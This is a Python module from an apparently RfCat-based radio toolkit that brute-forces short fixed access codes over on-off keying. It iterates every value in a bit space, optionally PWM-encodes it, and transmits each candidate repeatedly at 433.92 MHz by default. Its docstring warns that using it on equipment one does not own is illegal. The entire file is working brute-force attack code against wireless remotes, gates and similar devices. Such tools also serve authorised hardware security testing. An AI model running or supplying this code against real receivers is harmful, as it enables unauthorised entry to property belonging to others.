"""Brute-force a fixed-length code over OOK.

ETHICS / LEGAL: Brute-forcing access codes against systems you do not own
is illegal in most jurisdictions and may also constitute unauthorised access
under criminal law (CFAA, Computer Misuse Act, etc.). Use only against
equipment you own or are formally authorised to test.
See RFOX.md for the full disclaimer.
"""
import time
from . import _common

HELP = "Iterate a key space and transmit each value (short fixed codes)"


def add_args(p):
    _common.add_dongle_args(p)
    _common.add_profile_preset(p)
    _common.add_radio_args(p, sync=True, pktlen=True, preamble=True,
                           power=True, fixed=True)
    p.add_argument("--bits", type=int, required=False, default=12,
                   help="bit length of the code (default: 12)")
    p.add_argument("--start", type=lambda x: int(x, 0), default=0)
    p.add_argument("--stop", type=lambda x: int(x, 0), default=None,
                   help="exclusive (default: 1<<bits)")
    p.add_argument("--repeat", type=int, default=3,
                   help="repeat each candidate this many times")
    p.add_argument("--gap-ms", type=int, default=10)
    p.add_argument("--pwm", action="store_true",
                   help="PWM-encode each bit (0->1110, 1->1100)")
    p.add_argument("--print-every", type=int, default=256)


def prompt(args):
    args.freq = float(input(f"freq Hz [{args.freq or 433.92e6}]: ") or (args.freq or 433.92e6))
    args.bits = int(input(f"bit length [{args.bits}]: ") or args.bits)
    n = input(f"repeat each [{args.repeat}]: ").strip()
    if n:
        args.repeat = int(n)


def _bits_to_bytes(bits_str):
    pad = (8 - len(bits_str) % 8) % 8
    bits_str = bits_str + "0" * pad
    return bytes(int(bits_str[i:i+8], 2) for i in range(0, len(bits_str), 8))


def _pwm(bits_str):
    return "".join("1110" if b == "0" else "1100" for b in bits_str)


def run(args):
    from .. import dongle
    stop = args.stop if args.stop is not None else (1 << args.bits)
    cfg = _common.cfg_from_args(args)
    print(f"# brute {args.start:#x}..{stop:#x} ({stop-args.start} keys) on {cfg.summary()}")

    d = dongle.open_dongle(idx=args.index, debug=args.debug)
    dongle.apply_config(d, cfg)

    t0 = time.time()
    try:
        for n, val in enumerate(range(args.start, stop), 1):
            bits_str = format(val, f"0{args.bits}b")
            payload = _bits_to_bytes(_pwm(bits_str) if args.pwm else bits_str)
            for _ in range(args.repeat):
                d.RFxmit(payload)
                time.sleep(args.gap_ms / 1000.0)
            if n % args.print_every == 0:
                rate = n / (time.time() - t0)
                print(f"  {n}/{stop-args.start}  {bits_str}  {rate:.1f} keys/s")
    except KeyboardInterrupt:
        print("\n# stopped by user.")
    finally:
        d.setModeIDLE()
    return 0
